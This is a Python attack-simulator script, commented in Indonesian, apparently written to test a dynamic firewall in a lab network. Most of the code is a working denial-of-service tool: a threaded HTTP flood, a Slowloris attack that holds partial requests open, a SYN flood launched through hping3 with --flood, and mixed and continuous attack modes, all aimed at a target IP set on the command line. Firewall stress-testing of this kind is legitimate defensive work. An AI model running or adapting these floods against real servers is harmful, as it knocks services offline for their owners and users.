import subprocess
import time
import random
import argparse
import threading
import csv
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

class AttackSimulator:
    """
    Simulator serangan untuk testing Dynamic Firewall.
    Mendukung berbagai jenis serangan: HTTP Flood, Slowloris, dll.
    """
    
    def __init__(self, target_ip="172.20.0.10", target_port=80, log_file="/app/attack_log.csv"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_url = f"http://{target_ip}:{target_port}/"
        self.log_file = log_file
        self.results = []
        self.lock = threading.Lock()
        self.running = True
        
        print(f"[ATTACKER] Target: {self.target_url}")
        print(f"[ATTACKER] Log file: {self.log_file}")
    
    def log_attack(self, attack_type, status, response_time, timestamp):
        """Log hasil serangan."""
        with self.lock:
            self.results.append({
                'timestamp': timestamp,
                'attack_type': attack_type,
                'status': status,
                'response_time': response_time,
                'target': self.target_url
            })
    
    def save_logs(self):
        """Simpan log ke CSV."""
        os.makedirs(os.path.dirname(self.log_file) if os.path.dirname(self.log_file) else '.', exist_ok=True)
        with open(self.log_file, 'w', newline='') as f:
            if self.results:
                writer = csv.DictWriter(f, fieldnames=self.results[0].keys())
                writer.writeheader()
                writer.writerows(self.results)
        print(f"[ATTACKER] Log saved: {self.log_file} ({len(self.results)} entries)")
    
    def send_request(self, attack_type="http_flood"):
        """Kirim single HTTP request."""
        timestamp = datetime.now().isoformat()
        start_time = time.time()
        
        try:
            result = subprocess.run(
                ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}',
                 '--connect-timeout', '2', '--max-time', '5', self.target_url],
                capture_output=True,
                text=True,
                timeout=10
            )
            status = int(result.stdout.strip()) if result.stdout.strip().isdigit() else 0
            response_time = time.time() - start_time
        except Exception as e:
            status = 0
            response_time = time.time() - start_time
        
        self.log_attack(attack_type, status, response_time, timestamp)
        return status, response_time
    
    def http_flood(self, duration=60, requests_per_second=50, concurrency=20):
        """
        HTTP Flood Attack: Mengirim banyak HTTP request dalam waktu singkat.
        
        Args:
            duration: Durasi serangan (detik)
            requests_per_second: Target request per detik
            concurrency: Jumlah concurrent connections
        """
        print(f"\n{'='*60}")
        print(f"[ATTACK] HTTP FLOOD")
        print(f"[ATTACK] Duration: {duration}s | Rate: {requests_per_second} req/s | Concurrency: {concurrency}")
        print(f"{'='*60}\n")
        
        start_time = time.time()
        request_count = 0
        success_count = 0
        blocked_count = 0
        
        with ThreadPoolExecutor(max_workers=concurrency) as executor:
            while time.time() - start_time < duration and self.running:
                batch_start = time.time()
                batch_size = min(concurrency, requests_per_second // 5)
                
                futures = [executor.submit(self.send_request, "http_flood") for _ in range(batch_size)]
                
                for future in as_completed(futures):
                    status, _ = future.result()
                    request_count += 1
                    if status == 200:
                        success_count += 1
                    elif status == 0 or status == 503:
                        blocked_count += 1
                
                # Rate limiting
                elapsed = time.time() - batch_start
                sleep_time = max(0, (batch_size / requests_per_second) - elapsed)
                time.sleep(sleep_time)
                
                # Progress setiap 10 detik
                if int(time.time() - start_time) % 10 == 0:
                    elapsed_total = time.time() - start_time
                    rate = request_count / elapsed_total if elapsed_total > 0 else 0
                    print(f"[ATTACK] Progress: {elapsed_total:.0f}s | Requests: {request_count} | "
                          f"Success: {success_count} | Blocked: {blocked_count} | Rate: {rate:.1f} req/s")
        
        print(f"\n[ATTACK] HTTP Flood completed:")
        print(f"         Total requests: {request_count}")
        print(f"         Success (200): {success_count}")
        print(f"         Blocked/Failed: {blocked_count}")
        
        return request_count, success_count, blocked_count
    
    def slowloris(self, duration=60, connections=50):
        """
        Slowloris Attack: Membuka banyak koneksi dan mengirim data perlahan.
        Tujuan: Menghabiskan connection pool server.
        
        Args:
            duration: Durasi serangan (detik)
            connections: Jumlah koneksi yang dibuka
        """
        print(f"\n{'='*60}")
        print(f"[ATTACK] SLOWLORIS")
        print(f"[ATTACK] Duration: {duration}s | Connections: {connections}")
        print(f"{'='*60}\n")
        
        import socket
        
        sockets = []
        
        def create_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, self.target_port))
                s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode('utf-8'))
                s.send(f"Host: {self.target_ip}\r\n".encode('utf-8'))
                s.send("User-Agent: Mozilla/5.0\r\n".encode('utf-8'))
                s.send("Accept-Language: en-US,en;q=0.5\r\n".encode('utf-8'))
                return s
            except Exception:
                return None
        
        # Buka koneksi awal
        print(f"[ATTACK] Opening {connections} connections...")
        for _ in range(connections):
            s = create_socket()
            if s:
                sockets.append(s)
        
        print(f"[ATTACK] {len(sockets)} connections established")
        
        start_time = time.time()
        while time.time() - start_time < duration and self.running:
            # Kirim header partial untuk keep-alive
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
                except Exception:
                    sockets.remove(s)
                    new_s = create_socket()
                    if new_s:
                        sockets.append(new_s)
            
            self.log_attack("slowloris", len(sockets), 0, datetime.now().isoformat())
            
            elapsed = time.time() - start_time
            print(f"[ATTACK] Slowloris: {elapsed:.0f}s | Active connections: {len(sockets)}")
            time.sleep(5)
        
        # Cleanup
        for s in sockets:
            try:
                s.close()
            except:
                pass
        
        print(f"[ATTACK] Slowloris completed. Connections closed.")
        return len(sockets)
    
    def syn_flood_simulation(self, duration=60, packets_per_second=100):
        """
        SYN Flood Simulation: Menggunakan hping3 jika tersedia.
        Catatan: Memerlukan root/privileged mode.
        
        Args:
            duration: Durasi serangan (detik)
            packets_per_second: Jumlah SYN packets per detik
        """
        print(f"\n{'='*60}")
        print(f"[ATTACK] SYN FLOOD (Simulation)")
        print(f"[ATTACK] Duration: {duration}s | Rate: {packets_per_second} pkt/s")
        print(f"{'='*60}\n")
        
        try:
            # Cek apakah hping3 tersedia
            result = subprocess.run(['which', 'hping3'], capture_output=True, text=True)
            if result.returncode != 0:
                print("[ATTACK] hping3 not found. Using curl-based simulation instead.")
                return self.http_flood(duration, packets_per_second, 30)
            
            # Jalankan hping3 SYN flood
            cmd = [
                'hping3', '-S', '-p', str(self.target_port),
                '--flood', '-V',
                self.target_ip
            ]
            
            print(f"[ATTACK] Running: {' '.join(cmd)}")
            print(f"[ATTACK] Press Ctrl+C to stop early")
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(duration)
            process.terminate()
            
            print(f"[ATTACK] SYN Flood completed.")
            return True
            
        except Exception as e:
            print(f"[ATTACK] SYN Flood error: {e}")
            return False
    
    def mixed_attack(self, total_duration=300):
        """
        Mixed Attack Scenario: Kombinasi berbagai serangan.
        
        Timeline:
        - 0-60s: Reconnaissance (low-rate probing)
        - 60-180s: HTTP Flood (high intensity)
        - 180-240s: Slowloris
        - 240-300s: Final HTTP Flood burst
        """
        print(f"\n{'#'*60}")
        print(f"[ATTACK] MIXED ATTACK SCENARIO")
        print(f"[ATTACK] Total Duration: {total_duration}s")
        print(f"{'#'*60}\n")
        
        # Phase 1: Reconnaissance
        print("\n--- PHASE 1: RECONNAISSANCE (0-60s) ---")
        self.http_flood(duration=60, requests_per_second=10, concurrency=5)
        
        if not self.running:
            return
        
        # Phase 2: HTTP Flood
        print("\n--- PHASE 2: HTTP FLOOD (60-180s) ---")
        self.http_flood(duration=120, requests_per_second=100, concurrency=30)
        
        if not self.running:
            return
        
        # Phase 3: Slowloris
        print("\n--- PHASE 3: SLOWLORIS (180-240s) ---")
        self.slowloris(duration=60, connections=100)
        
        if not self.running:
            return
        
        # Phase 4: Final Burst
        print("\n--- PHASE 4: FINAL BURST (240-300s) ---")
        self.http_flood(duration=60, requests_per_second=150, concurrency=50)
        
        self.save_logs()
        
        print(f"\n{'#'*60}")
        print(f"[ATTACK] MIXED ATTACK COMPLETED")
        print(f"{'#'*60}")
    
    def stop(self):
        """Stop semua serangan."""
        self.running = False
        print("[ATTACKER] Stopping all attacks...")


def main():
    parser = argparse.ArgumentParser(description='Attack Simulator untuk Testing Firewall')
    parser.add_argument('--target', type=str, default='172.20.0.10', help='Target IP address')
    parser.add_argument('--port', type=int, default=80, help='Target port')
    parser.add_argument('--mode', type=str, 
                        choices=['flood', 'slowloris', 'syn', 'mixed', 'continuous'],
                        default='flood', help='Attack mode')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration (seconds)')
    parser.add_argument('--rate', type=int, default=50, help='Requests per second')
    parser.add_argument('--concurrency', type=int, default=20, help='Concurrent connections')
    parser.add_argument('--log', type=str, default='/app/attack_log.csv', help='Log file path')
    
    args = parser.parse_args()
    
    simulator = AttackSimulator(
        target_ip=args.target,
        target_port=args.port,
        log_file=args.log
    )
    
    try:
        if args.mode == 'flood':
            simulator.http_flood(
                duration=args.duration,
                requests_per_second=args.rate,
                concurrency=args.concurrency
            )
        elif args.mode == 'slowloris':
            simulator.slowloris(duration=args.duration, connections=args.concurrency)
        elif args.mode == 'syn':
            simulator.syn_flood_simulation(duration=args.duration, packets_per_second=args.rate)
        elif args.mode == 'mixed':
            simulator.mixed_attack(total_duration=args.duration)
        elif args.mode == 'continuous':
            print("[ATTACKER] Continuous mode - Press Ctrl+C to stop")
            while simulator.running:
                simulator.http_flood(duration=60, requests_per_second=args.rate, concurrency=args.concurrency)
                time.sleep(5)
    except KeyboardInterrupt:
        print("\n[ATTACKER] Interrupted by user")
        simulator.stop()
    finally:
        simulator.save_logs()


if __name__ == "__main__":
    main()